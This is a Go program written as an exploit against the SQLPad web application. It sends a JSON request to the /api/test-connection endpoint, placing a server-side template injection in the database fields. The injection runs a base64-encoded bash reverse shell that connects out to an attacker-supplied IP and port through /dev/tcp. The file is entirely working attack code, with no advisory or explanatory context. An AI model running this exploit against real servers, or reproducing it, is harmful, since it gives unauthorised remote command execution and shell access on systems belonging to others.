package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
)

const (
	contentType     = "application/json"
	acceptType      = "application/json"
	connectionRoute = "/api/test-connection"
)

// DataPayload represents the data section of the JSON payload.
type DataPayload struct {
	Database string `json:"database"`
}

// ExploitPayload represents the full JSON payload.
type ExploitPayload struct {
	Name     string      `json:"name"`
	Driver   string      `json:"driver"`
	Data     DataPayload `json:"data"`
	Database string      `json:"database"`
}

func main() {
	rootURL, attackerIP, attackerPort := parseArgs()

	targetURL := buildTargetURL(rootURL)

	payload := buildPayload(attackerIP, attackerPort)

	exploitPayload := createExploitPayload(payload)

	err := sendExploit(targetURL, exploitPayload)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Exploit sent successfully. Check your listener on %s:%s\n", attackerIP, attackerPort)
}

func parseArgs() (string, string, string) {
	rootURL := flag.String("u", "", "Root URL of the SQLPad application")
	attackerIP := flag.String("i", "", "Attacker IP")
	attackerPort := flag.String("p", "", "Attacker Port")

	flag.Parse()

	if *rootURL == "" || *attackerIP == "" || *attackerPort == "" {
		fmt.Println("All arguments (-u <root_url>, -i <attacker_ip>, -p <attacker_port>) must be provided.")
		os.Exit(1)
	}

	return *rootURL, *attackerIP, *attackerPort
}

func buildTargetURL(rootURL string) string {
	return fmt.Sprintf("%s%s", rootURL, connectionRoute)
}

func buildPayload(attackerIP, attackerPort string) string {
	endodedData := base64Encode(fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", attackerIP, attackerPort))
	return fmt.Sprintf(`{{ process.mainModule.require('child_process').exec('echo %s | base64 -d | bash') }}`, endodedData)
}

func base64Encode(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

func createExploitPayload(payload string) ExploitPayload {
	return ExploitPayload{
		Name:     "test",
		Driver:   "mysql",
		Data:     DataPayload{Database: payload},
		Database: payload,
	}
}

func sendExploit(targetURL string, exploitPayload ExploitPayload) error {
	jsonData, err := json.Marshal(exploitPayload)
	if err != nil {
		return fmt.Errorf("error marshalling JSON: %w", err)
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Accept", acceptType)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request: %w", err)
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			
		}
	}(resp.Body)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading response body: %w", err)
	}

	fmt.Printf("Response status code: %d\n", resp.StatusCode)
	fmt.Printf("Response body: %s\n", body)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server responded with status code: %d", resp.StatusCode)
	}

	return nil
}
